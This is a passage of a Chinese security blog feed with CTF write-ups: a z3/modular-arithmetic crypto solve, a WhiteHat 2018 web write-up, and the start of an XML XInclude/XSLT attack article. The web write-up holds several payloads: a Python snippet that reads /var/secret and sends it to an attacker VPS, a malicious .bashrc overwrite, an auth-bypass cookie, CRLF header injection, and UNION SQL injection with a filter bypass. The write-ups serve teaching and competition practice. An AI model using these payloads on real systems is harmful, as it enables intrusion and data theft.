class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"><span class="keyword">print</span> s.model()</span><br></pre></td></tr></table></figure></p><p>可以轻松得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sat</span><br><span class="line">[x = 2, z = 1, y = -3]</span><br><span class="line">[Finished in 0.3s]</span><br></pre></td></tr></table></figure></p><p>这里简单解释一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line">z = Int(<span class="string">'z'</span>)</span><br></pre></td></tr></table></figure></p><p>用于定于类型，包括整数、浮点数、BitVector、数组等<br>然后是<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = Solver()</span><br></pre></td></tr></table></figure></p><p>用Solver()创建求解器<br>紧接着<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s.add(y==<span class="number">2</span>*x<span class="number">-7</span>)</span><br><span class="line">s.add(<span class="number">5</span>*x+<span class="number">3</span>*y+<span class="number">2</span>*z==<span class="number">3</span>)</span><br><span class="line">s.add(<span class="number">3</span>*x+z==<span class="number">7</span>)</span><br></pre></td></tr></table></figure></p><p>我们使用add()为变量之间增加约束条件<br>最后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print s.check()</span><br><span class="line">print s.model()</span><br></pre></td></tr></table></figure></p><p>使用check()检查约束条件是否ok，并使用model()列出求解结果<br>这里再给出更多python z3 api文档<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://z3prover.github.io/api/html/namespacez3py.html</span><br></pre></td></tr></table></figure></p><h2 id="求解step1"><a href="#求解step1" class="headerlink" title="求解step1"></a>求解step1</h2><p>现在有了z3这样强大的约束求解器，我们可以尝试计算出a,b了<br>我们有约束条件<br><img src="/images/2018-08-22-15-35-36.png" alt=""><br>以及<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = [(sympy.randprime(2**256, 2**257) % m) for _ in range(3)]</span><br></pre></td></tr></table></figure></p><p>这样一来，我们可以写出相应的约束解决脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">z=<span class="number">213932962252915797768584248464896200082707350140827098890648372492180142394587</span></span><br><span class="line">m=<span class="number">282832747915637398142431587525135167098126503327259369230840635687863475396299</span></span><br><span class="line">x=<span class="number">254732859357467931957861825273244795556693016657393159194417526480484204095858</span></span><br><span class="line">y=<span class="number">261877836792399836452074575192123520294695871579540257591169122727176542734080</span></span><br><span class="line"></span><br><span class="line">a, b, c = BitVecs(<span class="string">'a b c'</span>, <span class="number">262</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(UGT(a, pow(<span class="number">2</span>, <span class="number">256</span>, m)))</span><br><span class="line">s.add(ULT(a, pow(<span class="number">2</span>, <span class="number">257</span>, m)))</span><br><span class="line">s.add(UGT(b, pow(<span class="number">2</span>, <span class="number">256</span>, m)))</span><br><span class="line">s.add(ULT(b, pow(<span class="number">2</span>, <span class="number">257</span>, m)))</span><br><span class="line">s.add(UGT(c, pow(<span class="number">2</span>, <span class="number">256</span>, m)))</span><br><span class="line">s.add(ULT(c, pow(<span class="number">2</span>, <span class="number">257</span>, m)))</span><br><span class="line">s.add(x == (a + b * <span class="number">3</span>) % m)</span><br><span class="line">s.add(y == (b - c * <span class="number">5</span>) % m)</span><br><span class="line">s.add(z == (a + c * <span class="number">8</span>) % m)</span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    A,B= s.model()[a].as_long(),s.model()[b].as_long()</span><br><span class="line">    <span class="keyword">if</span> gcd(A,B) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> A,B</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>这里有几点申明一下：<br>1.这里使用的是BitVecs，而不是Int，因为类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int），这样我们才能实现一些无符号和有符号二进制运算<br>2.关于<code>a, b, c = BitVecs(&#39;a b c&#39;, 262)</code>的范围选262的原因如下<br>我们在计算中有一步<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a + c * <span class="number">8</span></span><br></pre></td></tr></table></figure></p><p>这应该是在运算中可能生成的最大值，而我们知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = [(sympy.randprime(2**256, 2**257) % m) for _ in range(3)]</span><br></pre></td></tr></table></figure></p><p>所以这里我们假设a和c都是<code>2**257</code><br>估计极限最大值为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print len(bin(pow(2,257)*9)[2:])</span><br></pre></td></tr></table></figure></p><p>发现是261bit<br>故此我们选择262bit就不会溢出，导致check()无法通过<br>3.由于是约束条件，这里可能出现多组值，而根据之前我们的推算，我们需要gcd(a,b)=1，所以这一点加入约束中<br>运行脚本后，我们可以得到一组值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = 176268455401080975226023429120782206814426280508931609844850047979724152864469</span><br><span class="line">b = 214709966595887251005567190400910974312839914267660095937082916625495667341329</span><br></pre></td></tr></table></figure></p><h2 id="求解step2"><a href="#求解step2" class="headerlink" title="求解step2"></a>求解step2</h2><p>这里根据之前我们推导出的公式：<br><img src="/images/2018-08-22-15-35-51.png" alt=""><br>可以得到flag的脚本为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">M=<span class="number">349579051431173103963525574908108980776346966102045838681986112083541754544269</span></span><br><span class="line">p=<span class="number">240670121804208978394996710730839069728700956824706945984819015371493837551238</span></span><br><span class="line">q=<span class="number">63385828825643452682833619835670889340533854879683013984056508942989973395315</span></span><br><span class="line">a=<span class="number">176268455401080975226023429120782206814426280508931609844850047979724152864469</span></span><br><span class="line">b=<span class="number">214709966595887251005567190400910974312839914267660095937082916625495667341329</span></span><br><span class="line">s1,s2,tmp = libnum.xgcd(a, b)</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    p = primefac.modinv(p, M)</span><br><span class="line">    <span class="keyword">if</span> p&lt;<span class="number">0</span>:</span><br><span class="line">        p+=M</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    q = primefac.modinv(q, M)</span><br><span class="line">    <span class="keyword">if</span> q&lt;<span class="number">0</span>:</span><br><span class="line">        q+=M</span><br><span class="line">m=(pow(p,s1,M)*pow(q,s2,M)) % M</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure></p><p>注：这里s1或者s2会有一个为负数，这里的负数不是负值，是逆元的意思<br>运行即可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Math is simple, right? OwO&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>从这个题重温了不少数论的相关知识，以及一些优雅的crypto库，还算对得起数论老师了（逃）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/30548907" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30548907</a><br><a href="https://www.cnblogs.com/ZHijack/p/9001860.html" target="_blank" rel="noopener">https://www.cnblogs.com/ZHijack/p/9001860.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;figure class=&quot;highligh
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="rsa" scheme="http://skysec.top/tags/rsa/"/>
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2018WhiteHat-writeup</title>
    <link href="http://skysec.top/2018/08/20/2018WhiteHat-writeup/"/>
    <id>http://skysec.top/2018/08/20/2018WhiteHat-writeup/</id>
    <published>2018-08-20T07:50:19.000Z</published>
    <updated>2018-10-06T03:35:03.537Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于 https://xz.aliyun.com/t/2599</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨晚听说有个国z外的比赛叫whitehat，做了一会儿发现思路停滞，本打算今天再做，发现已经结束了，按老外的思路，走了一遍，还是挺有意思的</p><h2 id="上传条件竞争与-bashrc"><a href="#上传条件竞争与-bashrc" class="headerlink" title="上传条件竞争与.bashrc"></a>上传条件竞争与.bashrc</h2><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p>题目链接：</p><blockquote><p><a href="http://web01.grandprix.whitehatvn.com/" target="_blank" rel="noopener">http://web01.grandprix.whitehatvn.com/</a><br>题目描述<br>Description: manhndd is running a service file upload at web01.grandprix.whitehatvn.com, it is restored every 2 minutes. Every 1 minute after service starts, he ssh into server to check /var/secret. Can you get it?<br>Note: Player shouldn’t Dos web01, you can get source code and run in local</p><h3 id="题干分析"><a href="#题干分析" class="headerlink" title="题干分析"></a>题干分析</h3><p>刚拿到这道题的时候我走进了误区，题目给出了源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web01.grandprix.whitehatvn.com/SimpleHTTPServerWithUpload.py</span><br></pre></td></tr></table></figure></p></blockquote><p>看到<code>SimpleHTTPServer</code>，我的第一反应是ph写的这篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html</span><br></pre></td></tr></table></figure></p><p>我简单的测试了这个跳转的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web01.grandprix.whitehatvn.com//example.com/%2f..</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-08-19-15-56-45.png" alt=""><br>我发现的确可以成功跳转<br>我本以为这里可能会出现任意文件读取的问题，因为这里有flag的绝对路径<code>/var/secret</code><br>但这里没有附带的框架来继承或者使用这个类，所以我们很难进行目录穿越的文件读取<br>毕竟不是<code>web.py</code>或者<code>django</code></p><h3 id="胡乱摸索"><a href="#胡乱摸索" class="headerlink" title="胡乱摸索"></a>胡乱摸索</h3><p>想到这题本身是一个上传<br><img src="/images/2018-08-19-16-17-25.png" alt=""><br>我们随手测试一下，发现上传的目录是/opt<br>然后web会将目录列出来，我们可以任意访问该目录下的文件<br>我又尝试了一下目录穿越<br><img src="/images/2018-08-19-16-18-26.png" alt=""><br>发现没有写入权限<br>于是我尝试了一下<code>tmp</code><br><img src="/images/2018-08-19-16-18-51.png" alt=""><br>发现部分目录是可写的<br><img src="/images/2018-08-19-16-19-33.png" alt=""><br>并且直接使用<code>/tmp/1.png</code>这样，甚至不需要<code>../../</code>这样穿越</p><h3 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h3><p>既然这一点不行，我注意到了题目的提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Every 1 minute after service starts, he ssh into server to check /var/secret.</span><br></pre></td></tr></table></figure></p><p>我当时错误的理解为了每1分钟会重启一次服务，并且鬼迷心窍的想到了另一方法<br>因为我发现上传的路径和<code>SimpleHTTPServerWithUpload.py</code>是同一个路径<br>当时我天真的以为，如果我在当前目录下上传一个文件名与<code>SimpleHTTPServerWithUpload.py</code>import的库名一致，就会被引入<br>所以我利用Burp不断上传一个名为<code>posixpath.py</code>的文件<br>内容为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">'/var/secret'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">url = <span class="string">'http://vps_ip:23333/?'</span>+base64.b64encode(f)</span><br><span class="line">r = requests.get(url=url)</span><br></pre></td></tr></table></figure></p><p>我天真的以为在重启的时候，应该会引入这个文件，并且将flag打到我的vps<br>这里我利用了条件竞争与文件上传，应该满足题目的意思了吧，应该这样就是正解啦？<br>但是最终还是以失败告终，我的vps纹丝不动，没收到任何东西</p><h3 id="神来之笔"><a href="#神来之笔" class="headerlink" title="神来之笔"></a>神来之笔</h3><p>后来看到writeup，才发现是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashrc</span><br><span class="line">profile</span><br></pre></td></tr></table></figure></p><p>这里就要涉及到交互式shell和非交互式shell，login shell 和non-login shell<br>其中：<br>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。当它读到文件的结尾，shell也就终止了。<br>而bashrc与profile都用于保存用户的环境信息，bashrc用于non-loginshell，而profile用于login shell<br>所以这里<code>bashrc</code>可能可以成为一个突破口，因为该文件包含专用于某个用户的bash shell的bash信息,当该用户登录时以及每次打开新的shell时,该文件被读取<br>所以，如果我们能将<code>.bashrc</code>写到用户的目录下，在其每分钟打开ssh的时候，就会执行里面的命令，那么我们只要<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /var/secret /opt/skysky</span><br></pre></td></tr></table></figure></p><p>即可在当前目录下读到flag<br>我们首先测试一下，home有没有写权限<br><img src="/images/2018-08-19-16-20-17.png" alt=""><br>显然<code>/home</code>目录是不行的，那我们如何知道用户名呢？<br>还是那个不起眼的题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manhndd is running a service file upload at web01.grandprix.whitehatvn.com</span><br></pre></td></tr></table></figure></p><p>难道这人叫<code>manhndd</code>?<br>我们再试试<br><img src="/images/2018-08-19-16-21-28.png" alt=""><br>发现的确可以成功上传<br>那我们尝试覆盖上传<code>.bashrc</code><br><img src="/images/2018-08-19-16-25-42.png" alt=""><br>用burp一边上传竞争覆盖，一边访问skysky这个文件<br>一段时间后即可收到flag</p><h2 id="Interspire-Email-Marketer"><a href="#Interspire-Email-Marketer" class="headerlink" title="Interspire Email Marketer"></a>Interspire Email Marketer</h2><h3 id="题目信息-1"><a href="#题目信息-1" class="headerlink" title="题目信息"></a>题目信息</h3><p>题目链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web03.grandprix.whitehatvn.com:1337/</span><br></pre></td></tr></table></figure></p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>右键打开源代码，拉到最底下发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!--&lt;label&gt;@Buxu: Let&apos;s try to access admin page&lt;/label&gt;&lt;/br&gt; --&gt;</span><br></pre></td></tr></table></figure></p><p>题目要求我们登入admin页面<br><img src="/images/2018-08-19-16-32-54.png" alt=""><br>按照这里题目给出的要出，我们输入<br><img src="/images/2018-08-19-16-35-46.png" alt=""><br>发现是404<br>那我们简单探测一下端口<br>如果端口开放<br><img src="/images/2018-08-19-16-37-02.png" alt=""><br>如果端口关闭<br><img src="/images/2018-08-19-16-37-19.png" alt=""><br>简单探测的结果为<br><img src="/images/2018-08-19-16-40-47.png" alt=""><br>发现8088有结果<br><img src="/images/2018-08-19-16-41-02.png" alt=""><br>应该是301跳转了，那我们加个index.php试试<br><img src="/images/2018-08-19-16-41-53.png" alt=""><br>保存成html页面，查看后发现<br><img src="/images/2018-08-19-16-42-28.png" alt=""></p><h3 id="进一步思考"><a href="#进一步思考" class="headerlink" title="进一步思考"></a>进一步思考</h3><p>探测完端口，那么8088是什么服务的默认端口？还是说题目只是随便放在这个端口了？<br>若是，为什么不直接放在1337端口呢？<br>很快，我发现了自己的眼瞎= =<br>那页面里写着<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Interspire Email Marketer</span><br></pre></td></tr></table></figure></p><p>于是顺藤摸瓜搜了一下<br><img src="/images/2018-08-19-16-49-44.png" alt=""><br>没错，就是这个点非常瞩目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/44513/</span><br></pre></td></tr></table></figure></p><p>发现可以直接绕过admin的授权，即有这个cookie即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEM_CookieLogin=YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE1MDU0NzcyOTQ7czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30%3D</span><br></pre></td></tr></table></figure></p><p>那我们如何发送cookie呢？</p><h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p>这里的方案无意只有一点，即CRLF，因为path与host的拼接，这里很容易让人联想到能不能进行http头注入<br>于是我们简单构造为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url_path&quot;:&quot;admin/index.php HTTP/1.1\r\nCookie: IEM_CookieLogin=YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE1MDU0NzcyOTQ7czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30%3D\r\n&quot;,&quot;host&quot;:&quot;127.0.0.1:8088&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>访问发现<br><img src="/images/2018-08-19-16-56-22.png" alt=""><br>保存为html查看一下<br><img src="/images/2018-08-19-17-00-26.png" alt=""><br>我们成功登入了<br>到此为止，感到无奈</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>而后看到writeup，才知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/37935/</span><br></pre></td></tr></table></figure></p><p>还有一个漏洞可以利用，即sql注入(但是据说是非预期= =)<br>CVE中给出的payload是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/admin/index.php?Page=Addons&amp;Addon=dynamiccontenttags&amp;Action=Edit&amp;id=-1%27+UNION+Select+1,2,3,4--%20- [SQLi]</span><br><span class="line"></span><br><span class="line">http://www.example.com/admin/index.php?Page=Addons&amp;Addon=dynamiccontenttags&amp;Action=Edit&amp;id=-1%27+UNION+Select+1,version%28%29,3,4--%20-[SQLi]</span><br></pre></td></tr></table></figure></p><p>那我们仿照进行攻击即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url_path&quot;:&quot;admin/index.php?Page=Addons&amp;Addon=dynamiccontenttags&amp;Action=Edit&amp;id=-1%27+UNION+Select+1,2,3,4--%20- HTTP/1.1\r\nCookie: IEM_CookieLogin=YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE1MDU0NzcyOTQ7czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30%3D\r\n&quot;,&quot;host&quot;:&quot;127.0.0.1:8088&quot;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-08-19-17-05-28.png" alt=""><br>发现有过滤，于是我们还是老规矩，用字典fuzz一下<br><img src="/images/2018-08-19-17-08-41.png" alt=""><br>发现过滤的很少，考虑这里可能会对path进行urldecode，所以尝试了一下url编码绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union</span><br><span class="line">%75nion</span><br></pre></td></tr></table></figure></p><p>于是我们尝试<br><img src="/images/2018-08-19-17-23-00.png" alt=""><br>发现成功<br>注：由于有CVE，所以就不用测试列数了，就是4列<br>那我们去进行数据库探测，找到标志点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">form_text&amp;quot; value=&amp;quot;</span><br></pre></td></tr></table></figure></p><p>方便后面我们取出数据,查看数据库名<br><img src="/images/2018-08-19-17-24-25.png" alt=""><br>查看表名<br><img src="/images/2018-08-19-17-42-19.png" alt=""><br>查看列名<br><img src="/images/2018-08-19-17-44-16.png" alt=""><br>读出数据<br><img src="/images/2018-08-19-17-45-18.png" alt=""><br>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WhiteHat&#123;cbb66097f69c3938bfd4a157ab4ebe762a16c1b1&#125;</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/reznok/CTFWriteUps/tree/master/" target="_blank" rel="noopener">https://github.com/reznok/CTFWriteUps/tree/master/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="writeup" scheme="http://skysec.top/categories/writeup/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="writeup" scheme="http://skysec.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>浅析xml之xinclude &amp; xslt</title>
    <link href="http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/"/>
    <id>http://skysec.top/2018/08/18/浅析xml之xinclude-xslt/</id>
    <published>2018-08-18T02:41:56.000Z</published>
    <updated>2018-10-06T03:27:40.532Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发在安全客：https://www.anquanke.com/post/id/156227</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近依旧在研究xml及其相关安全问题<br>前一篇文章已经提及了较为大众且CTF中常见的xml攻击方式<br>这里再提两个较为小众的攻击方式（此处小众是指CTF比赛中不常见）</p><h2 id="Xinclude"><a href="#Xinclude" class="headerlink" title="Xinclude"></a>Xinclude</h2><h3 id="什么是xinclude？"><a href="#什么是xinclude？" class="headerlink" title="什么是xinclude？"></a>什么是xinclude？</h3><p>顾名思义，xinclude可以理解为xml include<br>熟悉编译/脚本语言的一定熟知，像php的include，python和java的import都是可以进行文件包含的。<br>那么文件包含有什么好处？<br>当然是可以使代码更整洁，我们可以将定义的功能函数放在function.php中，再在需要使用功能函数的文件中使用include包含function.php，这样就避免了重复冗余的函数定义，同样可以增加代码的可读性<br>故此，xinclude也不例外，它是xml标记语言中包含其他文件的方式</p><h3 id="为什么使用xinclude"><a href="#为什么使用xinclude" class="headerlink" title="为什么使用xinclude"></a>为什么使用xinclude</h3><p>正如如上所说，xinclude可以使代码可读性更高，这里给出官方手册中的样例，便于理解：<br>page.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">webpage</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Hello world!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"templates/footer.xml"</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2003/XInclude"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">webpage</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>footer.xml:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span>? Contoso Corp, 2003<span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>处理过程<br><img src="/images/2018-08-13-10-55-48.png" alt=""></p><h3 id="xinclude的语法介绍"><a href="#xinclude的语法介绍" class="headerlink" title="xinclude的语法介绍"></a>xinclude的语法介绍</h3><p>xinclude的语法相对来说，非常简单，只是在<code>http://www.w3.org/2003/XInclude</code>命名空间中的两个元素，即 include 和 fallback<br>常用的命名空间前缀是“xi”(但可以根据喜好自由使用任何前缀)</p><h4 id="xi-include-元素"><a href="#xi-include-元素" class="headerlink" title="xi:include 元素"></a>xi:include 元素</h4><p>元素中的几个属性:</p><ul><li>href — 对要包括的文档的 URI 引用。</li><li>parse — 它的值可以是“xml”或“text”，用于定义如何包括指定的文档（是作为 XML 还是作为纯文本）。默认值是“xml”。</li><li>xpointer — 这是一个 XPointer，用于标识要包括的 XML 文档部分。如果作为文本包括 (parse=”text”)，将忽略该属性。</li><li>encoding — 作为文本包括时，该属性提供所包括文档的编码提示信息。<br>样例如下：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"test.xml"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="xi-fallback-元素"><a href="#xi-fallback-元素" class="headerlink" title="xi:fallback 元素"></a>xi:fallback 元素</h4><p>简单而言，类似于<code>try...except...</code>，如果xinclude的内容出现问题，则显示fallback的内容<br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span 